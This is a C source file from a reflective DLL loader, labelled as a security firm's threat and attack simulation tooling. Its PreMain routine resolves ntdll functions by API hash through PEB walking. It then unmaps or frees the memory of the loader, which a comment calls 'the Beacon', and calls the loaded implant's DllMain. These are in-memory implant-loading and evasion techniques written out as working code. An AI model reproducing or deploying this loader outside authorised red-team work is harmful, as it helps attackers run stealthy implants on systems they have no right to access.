/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

BOOLEAN
WINAPI
DllMain( HINSTANCE, DWORD, LPVOID );

typedef struct
{
	D_API( NtUnmapViewOfSection );
	D_API( NtQueryVirtualMemory );
	D_API( NtFreeVirtualMemory );
	D_API( DllMain );
} API ;

/* API Hashes */
#define H_API_NTUNMAPVIEWOFSECTION	0x6aa412cd /* NtUnmapViewOfSection */
#define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_NTFREEVIRTUALMEMORY	0x2802c609 /* NtFreeVirtualMemory */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Frees the memory associated with the 
 * ReflectiveLoader before calling the
 * DllMain.
 *
!*/
D_SEC( E ) VOID PreMain( _In_ PVOID ImageBase, _In_ ULONG AddressOfEntryPoint )
{
	API				Api;
	MEMORY_BASIC_INFORMATION	Mbi;

	PVOID				Ret = NULL;
	SIZE_T				Len = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );

	Api.NtUnmapViewOfSection = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
	Api.NtQueryVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
	Api.NtFreeVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );

	/* Get return address! */
	Ret = C_PTR( __builtin_extract_return_addr( __builtin_return_address( 0 ) ) );

	/* Free the memory associated with the Beacon */
	if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), Ret, MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
		if ( Mbi.Type == MEM_MAPPED ) {
			/* Free the section */
			Api.NtUnmapViewOfSection( NtCurrentProcess(), Mbi.AllocationBase );
		};
		if ( Mbi.Type == MEM_PRIVATE ) {
			/* Free the virtual region */
			Api.NtFreeVirtualMemory( NtCurrentProcess(), &Mbi.AllocationBase, &Len, MEM_RELEASE );
		};
		/* Call Main! */
		Api.DllMain = C_PTR( U_PTR( ImageBase ) + AddressOfEntryPoint );
		Api.DllMain( ImageBase, 1, NULL );
		Api.DllMain( NULL, 4, NULL );
	};

	/* Does Not Return */
};
